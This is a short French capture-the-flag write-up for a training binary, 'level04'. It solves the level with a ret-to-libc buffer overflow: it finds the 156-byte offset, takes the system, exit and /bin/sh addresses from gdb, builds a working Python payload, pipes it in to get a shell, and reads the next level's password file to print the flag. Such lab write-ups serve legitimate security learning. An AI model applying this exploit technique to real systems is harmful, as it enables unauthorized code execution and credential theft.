En lançant le programme, celui ci nous "provoque" en nous demandant un shellcode.

Grâce au level01, cela nous fait penser directement à une attaque de type ret to libc, ce qui sera rapidement vérifiable.
Nous allons vérifier si cela est possible en tenant de faire segfault le programme.

Envoyer une chaine de caractère massive en entrée ne smeble pas provoquer un segfault, mais semble coincer le programme dans une boucle infinie.
Nous allons essayer  de trouver l'offeset à partir duquel le programme boucle inf.

Après de nombreux essais, nous arrivons à trouevr l'offset: 156.

En reprenant la même méthodologie que pour le level01, nous allons chercher les adresses des fonctions system, exit et de la string /bin/sh.

On fait tourner le programme une fois avec la commande 'r' depuis gdb, et on obtient nos infos de cette manière:

info function system: 0xf7e6aed0
info function exit: 0xf7e5eb70

La même méthode ne semble que le level01 ne semble pas nous donner accès à l'adresse de la string "/bin/sh", c equi est terriblement handicapant.
Ceci dit, on remarque que les fonction exit et system ont la même adresse que dans le level01.

On peut alor spenser que le level04 dispose de la même adresse pour /bin/sh.

Le payload sera constitué de la manière suivante: offset ('*' * 156) + "system" + "exit" + "/bin/sh"

```python -c 'print "*"*156+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"' > /tmp/payload```

```cat /tmp/payload - | ./level04```

```cat /home/users/level05/.pass```

Le flag est: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN